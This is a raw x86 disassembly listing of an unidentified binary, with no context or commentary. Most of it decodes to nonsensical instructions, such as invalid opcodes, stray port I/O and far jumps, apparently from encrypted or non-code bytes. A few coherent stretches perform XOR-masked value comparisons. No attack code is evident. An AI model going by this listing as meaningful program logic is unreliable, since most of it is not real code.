  41aa82:	cmp    BYTE PTR [esi],0xd8
  41aa85:	jne    0x41aa12
  41aa87:	test   al,0xe9
  41aa89:	fs sub edi,esp
  41aa8c:	(bad)  
  41aa8d:	aaa    
  41aa8e:	aad    0x55
  41aa90:	inc    ebp
  41aa91:	or     eax,0x1a16beba
  41aa96:	sub    ebx,DWORD PTR [ebx-0x42]
  41aa99:	imul   edi,DWORD PTR [esi+0x3d],0x3b
  41aa9d:	sbb    BYTE PTR [edi+ebx*4+0x24],bh
  41aaa1:	lock or BYTE PTR [ecx+ebp*2+0x65],dl
  41aaa6:	mov    ah,0x88
  41aaa8:	adc    BYTE PTR [esi+0x1b],0x2d
  41aaac:	rcr    DWORD PTR [ebp-0x7d529e52],1
  41aab2:	test   DWORD PTR [edi-0x2b],ebx
  41aab5:	outs   dx,BYTE PTR ds:[esi]
  41aab6:	popw   es
  41aab8:	pusha  
  41aab9:	jg     0x41aa57
  41aabb:	enter  0x778c,0x3d
  41aabf:	sub    eax,0xa8387ee5
  41aac4:	mov    ah,0xb8
  41aac6:	dec    edi
  41aac7:	xor    al,0x81
  41aac9:	pop    ecx
  41aaca:	bnd jmp 0xb3d20e50
  41aad0:	imul   edi,DWORD PTR [ebp-0x1551c13a],0x2b
  41aad7:	mov    al,0x5
  41aad9:	mov    es,WORD PTR [eax]
  41aadb:	mov    ecx,0x12124f6e
  41aae0:	pop    edi
  41aae1:	jns    0x41aaba
  41aae3:	fldenv gs:[ecx+0x32]
  41aae7:	shl    BYTE PTR gs:[edx],1
  41aaea:	mov    cl,0x4d
  41aaec:	in     eax,0x4
  41aaee:	(bad)  
  41aaef:	mov    edx,0x27ce4fa
  41aaf4:	pop    eax
  41aaf5:	fcomp  QWORD PTR es:0xe92e376b
  41aafc:	pop    es
  41aafd:	lea    ebx,ds:0x4d5d4d8d
  41ab03:	and    bl,cl
  41ab05:	jb     0x41aa92
  41ab07:	pop    esp
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x4220ab
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x4220ab
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x7c759d49],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x4bfe1818],bh
  41ab67:	jge    0x41ab47
  41ab69:	neg    ah
  41ab6b:	push   esp
  41ab6c:	fbld   TBYTE PTR [edx]
  41ab6e:	and    DWORD PTR [edx+0xeda89c5],ebx
  41ab74:	mov    ebp,0xac50018a
  41ab79:	or     eax,0xabdb56a6
  41ab7e:	xor    edx,DWORD PTR [ecx+0x5f]
  41ab81:	test   ebx,ecx
  41ab83:	jl     0x41aba6
  41ab85:	dec    edx
  41ab86:	mov    al,ds:0xf30b2725
  41ab8b:	push   ds
  41ab8c:	iret   
  41ab8d:	cwde   
  41ab8e:	popa   
  41ab8f:	dec    ebx
  41ab90:	jbe    0x41abb0
  41ab92:	inc    eax
  41ab93:	mov    esp,0x1e7838f7
  41ab98:	imul   dl
  41ab9a:	xchg   DWORD PTR [eax+0x6694072e],esp
  41aba0:	inc    eax
  41aba1:	adc    DWORD PTR ds:0x99bbee54,edi
  41aba7:	js     0x41abfc
  41aba9:	jne    0x41ab3e
  41abab:	adc    DWORD PTR [ebx-0x31a4e96c],edx
  41abb1:	push   edx
  41abb2:	mov    eax,ds:0xe54e5878
  41abb7:	mov    edx,DWORD PTR [esi+0x9]
  41abba:	and    al,0x59
  41abbc:	jmp    0x41abb8
  41abbe:	neg    DWORD PTR [eax+0x13]
  41abc1:	in     eax,dx
  41abc2:	xchg   DWORD PTR [ecx+0x606ed60b],ebx
  41abc8:	(bad)  
  41abc9:	(bad)  
  41abca:	cli    
  41abcb:	rcl    DWORD PTR [ebx-0x37f081d6],cl
  41abd1:	lahf   
  41abd2:	ficomp WORD PTR [ecx]
  41abd4:	or     eax,DWORD PTR [eax-0x5cc03c8b]
  41abda:	inc    esp
  41abdb:	jle    0x41ac1d
  41abdd:	jae    0x41abe1
  41abdf:	sub    BYTE PTR [edi],bl
  41abe1:	dec    eax
  41abe2:	cmp    al,0x15
  41abe4:	push   0x23da2444
  41abe9:	push   edx
  41abea:	xchg   DWORD PTR [ebp-0x2c],ebx
  41abed:	test   eax,0x8ca1b48
  41abf2:	jnp    0x41ac55
  41abf4:	cmp    eax,0xb74f7abe
  41abf9:	inc    edi
  41abfa:	mov    eax,0x4c3e7ac9
  41abff:	les    ebx,FWORD PTR [edx+0x33]
  41ac02:	mov    cl,0x83
  41ac04:	dec    edx
  41ac05:	shl    esi,1
  41ac07:	pusha  
  41ac08:	stos   DWORD PTR es:[edi],eax
  41ac09:	xlat   BYTE PTR ds:[ebx]
  41ac0a:	(bad)  
  41ac0b:	xor    eax,0xeb6a0af6
  41ac10:	les    eax,FWORD PTR [eax-0x50]
  41ac13:	mov    ch,BYTE PTR [ecx-0x45]
  41ac16:	pop    edi
  41ac17:	mov    bl,0x9f
  41ac19:	pop    esp
  41ac1a:	xlat   BYTE PTR ds:[ebx]
  41ac1b:	repnz and al,BYTE PTR [ebp+ebx*1-0x5f]
  41ac20:	adc    ch,BYTE PTR [ebx]
  41ac22:	mov    ebp,edx
  41ac24:	mov    ebx,0xd11a800f
  41ac29:	sub    edx,DWORD PTR [ecx]
  41ac2b:	enter  0xa30c,0xe7
  41ac2f:	bound  edx,QWORD PTR [esi]
  41ac31:	les    edx,FWORD PTR [esi-0x38]
  41ac34:	mov    ebx,0x4353da15
  41ac39:	sti    
  41ac3a:	je     0x41ac7e
  41ac3c:	loope  0x41ac8f
  41ac3e:	or     ecx,edi
  41ac40:	jne    0x41abc6
  41ac42:	sub    eax,0xd6d12eee
  41ac47:	mov    dh,0x47
  41ac49:	push   ecx
  41ac4a:	mov    dh,bl
  41ac4c:	pop    eax
  41ac4d:	je     0x41abf1
  41ac4f:	dec    edi
  41ac50:	sbb    BYTE PTR [edx+edi*2-0x7718e7ca],al
  41ac57:	inc    ebx
  41ac58:	mov    al,ds:0xa290b00c
  41ac5d:	and    al,0xb
  41ac5f:	(bad)  
  41ac60:	xchg   ebx,eax
  41ac61:	adc    DWORD PTR [ebx],edx
  41ac63:	and    al,0x22
  41ac65:	jne    0xf8f1c232
  41ac6b:	lds    edx,FWORD PTR [eax+0x23]
  41ac6e:	add    dl,BYTE PTR [ebp+0x2d]
  41ac71:	jbe    0x41ac33
  41ac73:	pusha  
  41ac74:	cli    
  41ac75:	pop    ebx
  41ac76:	lock adc dh,bl
  41ac79:	(bad)  
  41ac7a:	mov    edi,0x8d5aaddf
  41ac7f:	push   0xffffffa8
  41ac81:	test   ch,bh
  41ac83:	xchg   esp,eax
  41ac84:	xor    BYTE PTR [esi-0x2d],dh
  41ac87:	mov    ds:0x2f3abdfd,al
  41ac8c:	cmp    DWORD PTR [ebp+0x6c],edi
  41ac8f:	pusha  
  41ac90:	dec    eax
  41ac91:	outs   dx,BYTE PTR ds:[esi]
  41ac92:	or     cl,BYTE PTR [edi+0x1ed987e7]
  41ac98:	out    0xb4,eax
  41ac9a:	test   bl,0x1f
  41ac9d:	loop   0x41acad
  41ac9f:	hlt    
  41aca0:	aad    0xbc
  41aca2:	push   ebx
  41aca3:	mov    edx,0xbee5162
  41aca8:	mov    BYTE PTR [ebx+0x6f0c4e54],al
  41acae:	add    ah,BYTE PTR [esi-0x35f2ca4e]
  41acb4:	cmp    al,0x81
  41acb6:	cmc    
  41acb7:	xor    esi,esi
  41acb9:	or     al,0xc9
  41acbb:	push   esp
  41acbc:	loop   0x41ac82
  41acbe:	xor    DWORD PTR ds:[esp+ebx*4-0x55],esi
  41acc3:	fisubr DWORD PTR [esi+0x8]
  41acc6:	es fwait
  41acc8:	jge    0x41ad33
  41acca:	pop    edx
  41accb:	mov    eax,0x345b4b83
  41acd0:	jbe    0x41aca6
  41acd2:	scas   eax,DWORD PTR es:[edi]
  41acd3:	in     eax,dx
  41acd4:	pop    eax
  41acd5:	addr16 mov ah,0x86
  41acd8:	lods   eax,DWORD PTR ds:[esi]
  41acd9:	and    DWORD PTR [ecx+0x61],edx
  41acdc:	push   0x56e55258
  41ace1:	lods   al,BYTE PTR ds:[esi]
  41ace2:	mov    edx,0xb56a2772
  41ace7:	stc    
  41ace8:	jo     0x41ac8e
  41acea:	imul   ebp,edx,0x2e47eb80
  41acf0:	shl    BYTE PTR [ebx-0x6077cf64],cl
  41acf6:	xchg   esi,eax
  41acf7:	xchg   ebx,eax
  41acf8:	daa    
  41acf9:	pushf  
  41acfa:	xor    al,0x59
  41acfc:	dec    ecx
  41acfd:	pop    eax
  41acfe:	pop    ebx
  41acff:	mov    ch,0xc
  41ad01:	jnp    0x41ad4b
  41ad03:	(bad)
  41ad08:	scas   eax,DWORD PTR es:[edi]
  41ad09:	sbb    edi,eax
  41ad0b:	or     al,0x13
  41ad0d:	sbb    eax,DWORD PTR [ecx+0x76]
  41ad10:	sub    cl,dl
  41ad12:	dec    esi
  41ad13:	outs   dx,BYTE PTR ds:[esi]
  41ad14:	fs mov eax,0xfccb2fa5
  41ad1a:	and    DWORD PTR [edx+0x1271ad0e],esp
  41ad20:	imul   eax,DWORD PTR [eax-0x4],0x7a
  41ad24:	ror    ebx,cl
  41ad26:	mov    DWORD PTR [edi-0x6e4b29b0],esp
  41ad2c:	or     cl,BYTE PTR [edi]
  41ad2e:	stos   DWORD PTR es:[edi],eax
  41ad2f:	sub    al,bl
  41ad31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad32:	xchg   edi,eax
  41ad33:	aad    0x20
  41ad35:	jmp    0x41ad94
  41ad37:	inc    edx
  41ad38:	in     al,dx
  41ad39:	push   ds
  41ad3a:	or     bl,BYTE PTR [ebp+0x94cbf88]
  41ad40:	not    BYTE PTR [ecx+edi*1]
  41ad43:	stc    
  41ad44:	or     eax,0x1eae31e
  41ad49:	enter  0xff11,0xbb
  41ad4d:	mov    dh,0x59
  41ad4f:	and    eax,0x53899e81
  41ad54:	sub    al,0xaf
  41ad56:	pop    es
  41ad57:	sub    BYTE PTR [eax],bh
  41ad59:	mov    ax,ds:0x90090835
  41ad5f:	and    eax,0x61252b54
  41ad64:	stos   DWORD PTR es:[edi],eax
  41ad65:	push   edi
  41ad66:	or     eax,0x854c2f0e
  41ad6b:	cwde   
  41ad6c:	lds    edi,FWORD PTR [esi]
  41ad6e:	mov    fs,ebx
  41ad70:	cmp    BYTE PTR [edi+0x19],dl
  41ad73:	ds jp  0x41ad03
  41ad76:	xor    eax,0xe82ae588
  41ad7b:	scas   eax,DWORD PTR es:[edi]
  41ad7c:	sar    DWORD PTR [eax],1
  41ad7e:	and    BYTE PTR es:[ebx],dl
  41ad81:	fstp   DWORD PTR [esi]
  41ad83:	cmp    eax,ebx
  41ad85:	jne    0x41ad47
  41ad87:	jne    0x41ad97
  41ad89:	mov    ecx,ecx
  41ad8b:	inc    ebp
  41ad8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad8d:	enter  0x6b7b,0x1b
  41ad91:	push   es
  41ad92:	(bad)  
  41ad93:	xor    al,0x3e
  41ad95:	(bad)  
  41ad96:	or     eax,0x97da959
  41ad9b:	inc    ebx
  41ad9c:	fs js  0x41ad30
  41ad9f:	clc    
  41ada0:	les    edi,FWORD PTR [ebp+0x1a]
  41ada3:	and    DWORD PTR [esi],esp
  41ada5:	pop    edi
  41ada6:	pop    ds
  41ada7:	cwde   
  41ada8:	aam    0xe0
  41adaa:	add    ebx,DWORD PTR [edx+0x11]
  41adad:	jmp    0xe6d786e1
  41adb2:	xor    BYTE PTR [ebp-0x290e2892],0x81
  41adb9:	jne    0x41ad40
  41adbb:	dec    edi
  41adbc:	nop
  41adbd:	jae    0x41ada9
  41adbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc0:	jmp    0xc1a8f63b
  41adc5:	dec    ebx
  41adc6:	jmp    0x41ae23
  41adc8:	mov    ebp,0xaca1fee5
  41adcd:	in     eax,0x2a
  41adcf:	addr16 fucomp st(4)
  41add2:	fcomp  QWORD PTR ds:0xaad33cab
  41add8:	das    
  41add9:	xor    edi,DWORD PTR [eax]
  41addb:	ror    BYTE PTR [ecx-0x171d45bb],0x1b
  41ade2:	mov    al,ds:0xabeffb05
  41ade7:	sahf   
  41ade8:	jo     0x41ad72
  41adea:	cmp    BYTE PTR [ebx],al
  41adec:	push   es
  41aded:	cmp    eax,0x1d5a415e
  41adf2:	(bad)  
  41adf3:	and    al,0x49
  41adf5:	aaa    
  41adf6:	cmp    eax,0x93a542da
  41adfb:	push   eax
  41adfc:	call   0xe9a353f2
  41ae01:	push   0xb729d132
  41ae06:	jle    0x41ade2
  41ae08:	xor    eax,DWORD PTR [eax-0x22]
  41ae0b:	call   0x7126:0x90e47af1
  41ae12:	stos   BYTE PTR es:[edi],al
  41ae13:	adc    eax,0x830d613
  41ae18:	cwde   
  41ae19:	xchg   edx,eax
  41ae1a:	repnz sbb ecx,DWORD PTR [eax-0x52]
  41ae1e:	and    DWORD PTR ds:0x6c5bec5,0x24709a41
  41ae28:	(bad)  
  41ae29:	push   eax
  41ae2a:	test   DWORD PTR es:[ecx+0x1a],0x9218a9eb
  41ae32:	sti    
  41ae33:	sbb    BYTE PTR [eax],dl
  41ae35:	xchg   ecx,eax
  41ae36:	scas   al,BYTE PTR es:[edi]
  41ae37:	icebp  
  41ae38:	shr    BYTE PTR [edi],0x8
  41ae3b:	in     eax,dx
  41ae3c:	das    
  41ae3d:	mov    al,0x27
  41ae3f:	pop    ss
  41ae40:	out    dx,eax
  41ae41:	rcr    edx,1
  41ae43:	or     bh,BYTE PTR [ebx-0xd]
  41ae46:	and    bh,bl
  41ae48:	mov    bl,0x17
  41ae4a:	test   al,0x72
  41ae4c:	sbb    esp,esi
  41ae4e:	in     eax,dx
  41ae4f:	je     0x41aebf
  41ae51:	addr16 cwde 
  41ae53:	xlat   BYTE PTR ds:[ebx]
  41ae54:	xor    DWORD PTR [ecx],edx
  41ae56:	bound  edi,QWORD PTR [edx+0x6e75bc57]
  41ae5c:	in     eax,dx
  41ae5d:	adc    DWORD PTR [edx],edx
  41ae5f:	sub    DWORD PTR [ebx+0x0],esp
  41ae62:	cmovno edi,ebx
  41ae65:	mov    dl,0xdf
  41ae67:	and    eax,0x2dca9fba
  41ae6c:	sbb    al,0x42
  41ae6e:	and    ebp,DWORD PTR [esp+ebp*4-0x41]
  41ae72:	jnp    0x41ae04
  41ae74:	jne    0x41ae50
  41ae76:	dec    ebx
  41ae77:	and    al,bh
  41ae79:	dec    ebx
  41ae7a:	aad    0x91
  41ae7c:	or     ebx,esp
  41ae7e:	das    
  41ae7f:	int    0x89
  41ae81:	fimul  DWORD PTR [edx]
  41ae83:	loop   0x41aed8
  41ae85:	loopne 0x41ae4d
  41ae87:	ret    0x9e28
  41ae8a:	es es int 0x5d
  41ae8e:	int3   
  41ae8f:	stos   DWORD PTR es:[edi],eax
  41ae90:	iret   
  41ae91:	std    
  41ae92:	dec    BYTE PTR [edi-0x4c42d563]
  41ae98:	aas    
  41ae99:	pop    esp
  41ae9a:	jnp    0x41ae36
  41ae9c:	or     DWORD PTR [edi],edi
  41ae9e:	repz aaa 
  41aea0:	sbb    edi,esi
  41aea2:	ror    BYTE PTR [ebp+0x310afd8],cl
  41aea8:	std    
  41aea9:	ins    BYTE PTR es:[edi],dx
  41aeaa:	xchg   ecx,eax
  41aeab:	cmp    al,0xe2
  41aead:	imul   ebp,DWORD PTR [ebx-0x76e3e36a],0xaeb868ff
  41aeb7:	mov    ds:0xbfabd087,eax
  41aebc:	sar    DWORD PTR [ebp-0x3796170f],1
  41aec2:	(bad)  
  41aec4:	call   0x421c:0xde3401c1
  41aecb:	in     eax,0xf5
  41aecd:	jg     0x41aefa
  41aecf:	into   
  41aed0:	pop    edx
  41aed1:	mov    ch,0xd2
  41aed3:	sbb    dh,0x38
  41aed6:	inc    ecx
  41aed7:	cld    
  41aed8:	cmp    DWORD PTR [edx],eax
  41aeda:	fsub   DWORD PTR [edx]
  41aedc:	shr    edx,0xbc
  41aedf:	test   eax,0x6779487d
  41aee4:	bound  ebx,QWORD PTR [ebp+0x6]
  41aee7:	sub    DWORD PTR [eax-0x6ba0e2ce],edx
  41aeed:	cld    
  41aeee:	jne    0x41aeb4
  41aef0:	inc    esp
  41aef1:	pop    esp
  41aef2:	ds jge 0x41af52
  41aef5:	scas   eax,DWORD PTR es:[edi]
  41aef6:	mov    al,0x95
  41aef8:	push   0x70
  41aefa:	add    edx,DWORD PTR [edi]
  41aefc:	call   0x6e900909
  41af01:	mov    edi,0xb2f72d4d
  41af06:	xor    al,0xd4
  41af08:	in     al,0x63
  41af0a:	inc    esi
  41af0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af0c:	xchg   esp,eax
  41af0d:	out    0x7b,eax
  41af0f:	lea    esp,[esi+0x70]
  41af12:	adc    esp,DWORD PTR [edx]
  41af14:	add    ebp,eax
  41af16:	push   ss
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af33
  41af80:	jl     0x41afd3
  41af82:	jle    0x41af9b
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1-0x33a8e7e8],bh
  41af8d:	out    dx,eax
  41af8e:	imul   DWORD PTR [ebp-0x71]
  41af91:	jg     0x41afbd
  41af93:	(bad)  
  41af94:	mov    al,0xc9
  41af96:	xchg   esi,eax
  41af97:	push   esp
  41af98:	stos   BYTE PTR es:[edi],al
  41af99:	xchg   ebx,eax
  41af9a:	pop    edi
  41af9b:	jge    0x41af57
  41af9d:	ins    BYTE PTR es:[edi],dx
  41af9e:	and    al,0x9e
  41afa0:	xor    eax,0x62093564
  41afa5:	pop    edi
  41afa6:	(bad)  
  41afa7:	rcr    BYTE PTR [edx+0x4c992a18],1
  41afad:	xchg   ebx,eax
  41afae:	fcomp  DWORD PTR [eax]
  41afb0:	lahf   
  41afb1:	loopne 0x41aff9
  41afb3:	add    eax,DWORD PTR [edi]
  41afb5:	sar    ah,cl
  41afb7:	test   DWORD PTR [ebx],edi
  41afb9:	pop    edi
  41afba:	push   ebp
  41afbb:	mov    ds:0xfd858a15,eax
  41afc0:	test   ebx,edx
  41afc2:	push   ds
  41afc3:	clc    
  41afc4:	daa    
  41afc5:	sub    BYTE PTR [ecx+edi*2+0x595110c4],dh
  41afcc:	ds push es
  41afce:	cmp    al,0x28
  41afd0:	inc    ebx
  41afd1:	mov    ch,0xea
  41afd3:	fistp  DWORD PTR [esi+0x43febc69]
  41afd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afda:	loop   0x41afbc
  41afdc:	mov    esi,0xc9556dfb
  41afe1:	jecxz  0x41affd
  41afe3:	xor    eax,0x26818f14
  41afe8:	test   BYTE PTR [edi],bl
  41afea:	dec    esp
  41afeb:	lea    ecx,[edi]
  41afed:	fwait
  41afee:	jmp    0xed7524e6
  41aff3:	and    ecx,edi
  41aff5:	sub    BYTE PTR [ebp+0x53],dl
  41aff8:	iret   
  41aff9:	int3   
  41affa:	adc    bl,BYTE PTR [edx+0x61c642b6]
  41b000:	add    dl,BYTE PTR [ebx+0x7c]
  41b003:	sub    BYTE PTR [ecx-0x40574b22],al
  41b009:	lahf   
  41b00a:	fld    DWORD PTR [eax]
  41b00c:	adc    esp,edx
  41b00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b00f:	jnp    0x41afb9
  41b011:	hlt    
  41b012:	loopne 0x41b091
  41b014:	ja     0x41b01f
  41b016:	(bad)  
  41b017:	sbb    ecx,DWORD PTR [eax+0x2c41967a]
  41b01d:	jmp    0x7fe6:0x481d1bdc
  41b024:	dec    edi
  41b025:	mov    ch,0xc7
  41b027:	popa   
  41b028:	sahf   
  41b029:	js     0x41afbc
  41b02b:	out    dx,eax
  41b02c:	mov    ecx,0x9e6995d2
  41b031:	(bad)
  41b034:	inc    ebx
  41b035:	pop    edi
  41b036:	loope  0x41b021
  41b038:	mov    ds:0x15492a8a,al
  41b03d:	rcl    BYTE PTR [edi-0x4],0xcd
  41b041:	leave  
  41b042:	mov    cl,0xa
  41b044:	cli    
  41b045:	xchg   esi,eax
  41b046:	xor    BYTE PTR [ecx],dl
  41b048:	fadd   DWORD PTR [edi+0x2a]
  41b04b:	aad    0x18
  41b04d:	sub    ebx,edi
  41b04f:	ret    
  41b050:	push   0x1
  41b052:	sbb    BYTE PTR [edx+0x736f7fc0],al
  41b058:	fisttp QWORD PTR [edi-0x1bcc346e]
  41b05e:	mov    ah,0xa1
  41b060:	push   ss
  41b061:	xchg   ebp,eax
  41b062:	repnz faddp st(0),st
  41b065:	lods   al,BYTE PTR ds:[esi]
  41b066:	mov    ds:0xe1dc07f1,eax
  41b06b:	imul   esi,DWORD PTR [edx-0x48],0x4b
  41b06f:	ja     0x41b063
  41b071:	sbb    al,0x62
  41b073:	fcomp  QWORD PTR ds:0x35b966a6
  41b079:	daa    
  41b07a:	add    ah,BYTE PTR [esi-0x79dc51ba]
  41b080:	mov    esp,0x8781c589
  41b085:	rol    BYTE PTR [ebp-0x49],1
  41b088:	cmp    bl,BYTE PTR [ebx+0x5265959d]
  41b08e:	ins    DWORD PTR es:[edi],dx
  41b08f:	xchg   esi,eax
  41b090:	aam    0xcb
  41b092:	inc    esi
  41b093:	mov    eax,0xeb5c9ebb
  41b098:	ss or  ecx,edi
  41b09b:	pop    eax
  41b09c:	out    dx,al
  41b09d:	xchg   ebp,eax
  41b09e:	mov    ah,0xb8
  41b0a0:	sub    edi,DWORD PTR [edi]
  41b0a2:	stc    
  41b0a3:	loopne 0x41b08c
  41b0a5:	aas    
  41b0a6:	push   ss
  41b0a7:	xchg   DWORD PTR [ecx],ebp
  41b0a9:	adc    DWORD PTR [edi+0x7a5d7be],edx
  41b0af:	push   es
  41b0b0:	sbb    BYTE PTR [edi-0x3c18dad5],ch
  41b0b6:	push   cs
  41b0b7:	imul   esi,DWORD PTR [esp+edx*8+0x4a],0xc47ca3ba
  41b0bf:	mov    ebp,0xcd55512c
  41b0c4:	rol    DWORD PTR [ecx+0x52f9dafb],0xd9
  41b0cb:	jecxz  0x41b0db
  41b0cd:	jg     0x41b11e
  41b0cf:	jg     0x41b08c
  41b0d1:	mov    ds:0x2da345ba,al
  41b0d6:	mov    esi,0x447b8e
  41b0db:	in     eax,0xaf
  41b0dd:	call   0xce66a1c8
  41b0e2:	pusha  
  41b0e3:	loopne 0x41b12e
  41b0e5:	pop    ss
  41b0e6:	test   eax,0x619d13a1
  41b0eb:	mov    ds:0x8e291f8d,eax
  41b0f0:	mov    ah,0xf7
  41b0f2:	add    DWORD PTR [eax-0x4f9a8ee2],esi
  41b0f8:	jbe    0x41b114
  41b0fa:	ret    
  41b0fb:	mov    cl,0x49
  41b0fd:	jne    0x41b0ac
  41b0ff:	xor    DWORD PTR [ecx+eax*8],eax
  41b102:	ret    0x5866
  41b105:	mov    ebp,ebp
  41b107:	hlt    
  41b108:	mov    edi,0xeb51896e
  41b10d:	icebp  
  41b10e:	push   eax
  41b10f:	aaa    
  41b110:	jo     0x41b0ea
  41b112:	fld    TBYTE PTR [ecx+0x8]
  41b115:	push   ebx
  41b116:	sbb    ebx,0xe55612c6
  41b11c:	adc    DWORD PTR ds:0x5d1ee017,ebx
  41b122:	cdq    
  41b123:	push   edi
  41b124:	push   esp
  41b125:	or     al,0x56
  41b127:	sub    bl,bh
  41b129:	mov    BYTE PTR [edx],dh
  41b12b:	(bad)  
  41b12c:	push   eax
  41b12d:	xchg   ebx,eax
  41b12e:	sbb    eax,0x257014bc
  41b133:	out    dx,al
  41b134:	xor    bl,BYTE PTR [edi+0x62]
  41b137:	xchg   esi,eax
  41b138:	(bad)  
  41b139:	lods   al,BYTE PTR ds:[esi]
  41b13a:	(bad)  
  41b13b:	stc    
  41b13c:	jo     0x41b10b
  41b13e:	mov    bl,0xc7
  41b140:	cli    
  41b141:	(bad)  
  41b142:	cmp    al,0x21
  41b144:	outs   dx,DWORD PTR ds:[esi]
  41b145:	push   eax
  41b146:	and    dh,BYTE PTR [ecx+0x5df9be36]
  41b14c:	sbb    sp,di
  41b14f:	fnstenv [edi]
  41b151:	push   ebp
  41b152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b153:	mov    esi,0x7ec34c3f
  41b158:	retf   0x65ce
  41b15b:	scas   eax,DWORD PTR es:[edi]
  41b15c:	push   ebx
  41b15d:	shl    eax,cl
  41b15f:	add    BYTE PTR [ebp+0x4216c3cc],bh
  41b165:	or     dl,BYTE PTR [esi+0x5e298597]
  41b16b:	enter  0xc052,0x55
  41b16f:	cmp    eax,0xbbdf3b93
  41b174:	(bad)  
  41b175:	dec    eax
  41b176:	fld    QWORD PTR [eax+0xd8e667a]
  41b17c:	adc    BYTE PTR [ebx],dl
  41b17e:	dec    edx
  41b17f:	mov    ebp,0xd36bdba5
  41b184:	cmp    BYTE PTR [esi],cl
  41b186:	and    DWORD PTR [ecx],ecx
  41b188:	out    dx,eax
  41b189:	jmp    0xe6bd:0x3c3df4d2
  41b190:	(bad)  [eax+edx*8-0x5b2476a6]
  41b197:	inc    ebx
  41b198:	mov    BYTE PTR [edx+0x4c],bh
  41b19b:	scas   al,BYTE PTR es:[edi]
  41b19c:	ret    
  41b19d:	sbb    BYTE PTR [ebx+0x65],ah
  41b1a0:	mov    esp,0xe809edab
  41b1a5:	lahf   
  41b1a6:	fbld   TBYTE PTR [edi]
  41b1a8:	xor    bh,al
  41b1aa:	pop    esi
  41b1ab:	push   0xdc8de732
  41b1b0:	jb     0x41b1f3
  41b1b2:	mov    edx,DWORD PTR [ecx]
  41b1b4:	aam    0x98
  41b1b6:	les    esp,FWORD PTR [ebx+0x1b]
  41b1b9:	loop   0x41b177
  41b1bb:	cs iretw 
  41b1be:	lea    esi,[edx-0x54cd991e]
  41b1c4:	shr    BYTE PTR [ebx-0x10],1
  41b1c7:	arpl   WORD PTR [eax],ax
  41b1c9:	pop    esi
  41b1ca:	mov    BYTE PTR [ecx+edi*1],dh
  41b1cd:	xor    ebp,DWORD PTR [esi+0x7e]
  41b1d0:	or     DWORD PTR [ebx],edi
  41b1d2:	mov    al,ds:0xda966066
  41b1d7:	push   ss
  41b1d8:	pop    es
  41b1d9:	out    0xc1,al
  41b1db:	push   ebp
  41b1dc:	cmp    al,0xf7
  41b1de:	or     DWORD PTR [ebp+0x1b],edx
  41b1e1:	xor    BYTE PTR [ebp-0xd8e0405],dl
  41b1e7:	or     DWORD PTR [esi],ecx
  41b1e9:	cld    
  41b1ea:	in     al,dx
  41b1eb:	cli    
  41b1ec:	and    DWORD PTR gs:[ebx],ebx
  41b1ef:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b1f1:	jno    0x41b1ea
  41b1f3:	dec    ebx
  41b1f4:	lods   eax,DWORD PTR ds:[esi]
  41b1f5:	inc    edi
  41b1f6:	xchg   ebx,eax
  41b1f7:	hlt    
  41b1f8:	mov    edx,0xc5bf040f
  41b1fd:	push   ebx
  41b1fe:	pop    esi
  41b1ff:	out    0xc9,al
  41b201:	mov    al,ds:0xb161b866
  41b206:	adc    eax,0xccfbfa98
  41b20b:	xor    BYTE PTR [edi-0x2e],ah
  41b20e:	js     0x41b1d3
  41b210:	xchg   edx,eax
  41b211:	rol    BYTE PTR [ecx+0x64e072e7],1
  41b217:	mov    bl,0x9
  41b219:	in     al,dx
  41b21a:	fs pushf 
